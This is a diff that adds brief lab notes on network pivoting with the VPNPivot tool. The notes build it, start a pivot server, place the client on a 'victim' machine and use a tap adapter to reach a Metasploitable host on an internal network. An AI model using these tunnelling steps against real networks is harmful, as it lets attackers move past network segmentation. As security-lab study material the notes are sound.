@@ -1,1 +1,40 @@
+cd VPNPivot
+
+sudo ./autogen.sh
+sudo ./configure
+make & make start
+pivots - is pivotserver
+pivotc - is pivotclient
+
+sudo ./pivots -h
+
+ifconfig
+ping 10.10.10.130
+
+sudo ./pivots -i tap0 -p 1234
+
+- transfer the pivotc binary to the other system
+sudo ./pivotc 192.168.69.133 1234 10.10.10.130
+(10.10.10.130 as ens38 as the pivoting network we want)
+(this should connect on the server side and we should see it as connected now)
+
+(on victim)
+sudo dhclient -v tap0
+ifconfig
+(see tap0 adapter with IP 10.10.10.132)
+
+(to metasploitable)
+ping 10.10.10.5
+(it should ping)
+
+- this is how we can create that adapter to PIVOT the data!!!!
+
+
+
+
+
+
+
+
+
 
